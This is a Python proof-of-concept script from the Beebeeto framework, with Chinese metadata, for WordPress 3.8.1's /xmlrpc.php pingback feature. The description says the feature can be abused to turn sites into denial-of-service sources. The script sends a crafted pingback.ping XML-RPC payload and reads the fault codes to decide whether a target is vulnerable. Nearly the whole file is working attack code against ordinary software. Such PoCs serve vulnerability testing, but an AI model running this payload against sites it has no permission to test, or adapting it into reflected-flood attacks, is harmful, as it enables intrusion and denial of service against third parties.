#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0049',
            'name': 'WordPress 3.8.1 /xmlrpc.php 拒绝服务漏洞 POC',
            'author': '1024',
            'create_date': '2014-10-04',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['3.8.1'],
            'type': 'Denial of Service',
            'tag': ['WordPress漏洞', '/xmlrpc.php', '拒绝服务漏洞', 'dos'],
            'desc': 'WordPress 3.8.1 /xmlrpc.php 文件有ping其他主机的功能，通过这个功能可以请求攻击别的网站。',
            'references': ['http://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        xml_url = args['options']['target'] + '/xmlrpc.php'
        page_url = args['options']['target'] + '/?p=2'
        post_content = ("<methodCall><methodName>pingback.ping</methodName><params><param>"
                        "<value><string>http://127.0.0.1</string></value></param><param>"
                        "<value><string>%s</string></value></param></params></methodCall>")
        post_content = post_content % (page_url)
        if args['options']['verbose']:
            print '[*] Requst URL: ' + xml_url
            print '[*] POST Content: ' + post_content
        request = urllib2.Request(xml_url, post_content)
        response = urllib2.urlopen(request)
        page_content = response.read()
        if '<methodResponse>' in page_content:
            if ('>17<' in page_content) or ('>32<' in page_content):
                args['success'] = True
                args['vul_url'] = xml_url
                return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
